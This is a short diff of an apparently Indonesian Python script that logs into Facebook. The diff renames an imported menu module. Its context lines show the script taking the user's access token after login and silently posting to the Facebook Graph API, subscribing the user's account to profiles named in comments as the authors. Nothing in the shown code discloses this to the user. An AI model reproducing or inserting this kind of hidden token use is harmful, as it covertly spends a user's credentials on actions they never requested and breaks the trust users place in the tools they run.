@@ -1,5 +1,5 @@
 import requests,os,json
-import premium
+import rename
 
 P = "\x1b[0;97m" # Putih
 M = "\x1b[0;91m" # Merah
@@ -40,4 +40,4 @@ def main():
     requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
     requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) # Hanifan
     print('\n%s[%s!%s] %sLogin Berhasil'%(K,P,K,P))
-    exit(premium.menu())
+    exit(rename.menu())
